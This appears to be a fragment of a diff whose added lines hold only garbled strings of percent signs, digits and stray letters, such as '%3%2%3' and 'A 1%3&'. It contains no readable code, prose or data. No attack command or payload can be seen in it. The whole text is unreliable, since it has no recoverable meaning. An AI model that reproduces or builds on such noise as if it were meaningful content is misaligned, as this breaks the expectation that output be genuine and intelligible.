+     A%3 1%3%3%2%3%2%3%3 8%2%2%3%3 3%3%3*3  C%2*7   %*2%3%0%3/;9%3%3%1 0%3% A%3%3%2%7%3%C1%3  A%3    %%4 4%3%3%3%2%3%3%3&%2%3%5%3%2%3%3%0%2%3%3 3%3%3%2%3%3%3%2%3%2%3%2%2%3%3%0%3%2%3%5%0%2%3%3%7%2%3  1  A 7%3.0%2%5  1  A  3%3%2%3
+
+&%1
+5%1%2%2%2%0%3%1  %/1%2%2  3%2     A  3%1%2%2%2%1%3%3%3%2%5%2%3%2%1 7%1%3%3%3%3%2%2%2%1%3%2%2%7%3%2%2%2%3%3%2%3%3%2%2%3%3%  A 1%5%2%3%3&%2%2%3%2%1%3%3%2%3%3%3%3%3%2%3%5%3%2%3&%3%1%3%3%7+C%3%3%3%3%3&%5%2%3%2%3%7%2%3   A 3%2%2%3%3%2%5%3%1%2%1%2%3%3%2%2%2%1%1%1%2%2%3%3%1%2%2%2%2%2%1%3%3%2%2%3%2%2%2%2%3%1%5  A     A  A  1%3%3%3  5  A 1 9%2%0%3%27  A  A 1%3%3%1  A  A%3%9%2%3%1%2%1%3%3%5   A  A 1%3&%1%2%5%3%3*3%1%2%0%1  A 5%3%5%3%3%2%3%3&%3&%2%1  and  A 1%2%3&%3%3%2%3&1%2%2&%2   A 1  A 1%3%2%2%2%1 1%2%0%2%0%2%2&%2%2%3%2%2%2%2%2%2%3A 1%2%3%2%2%0%2%2&%3%3%2%2%2%2%2%2%3&%3%2%2%3%2%3%3%2%2%2%2%3%2%7%2%3%3%2%2%2%2%2%2%2%3%2%2%1%3%2%3%3  A  %b  A 1%2%2%2%3%2%3%3   A 0%2%2%2%2%3%2%2%2%3  A 1 1  
+1%2C%2%2%0 0%0%3%2%3 1  A  0%3&0%2%8%3& 0%3%3%2%7%0%3%3%3%25%3%0%2%3"
